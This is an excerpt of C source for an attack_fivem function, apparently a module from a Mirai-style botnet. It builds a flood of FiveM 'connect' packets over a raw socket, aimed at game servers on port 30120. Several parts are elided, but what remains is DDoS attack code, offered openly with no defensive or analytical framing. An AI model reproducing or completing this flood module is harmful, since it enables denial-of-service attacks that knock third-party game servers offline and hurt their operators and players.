...
void attack_fivem(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 30120);
    ...
    // FiveM connection request payload (simplified)
    unsigned char fivem_data[] = {
        0x04, 0x00, 0x00, 0x00, 0x63, 0x6F, 0x6E, 0x6E,
        0x65, 0x63, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0x69, 0x70, 0x00, 0x00
    };
    int pattern_len = sizeof(fivem_data);
    ...
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting FiveM attack\n");
#endif
        return;
    }
    i = 1;
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        while (offset < data_len)
        {
            ...
            util_memcpy(data + offset, fivem_data, copy_size);
            offset += pattern_len;
        }
    }
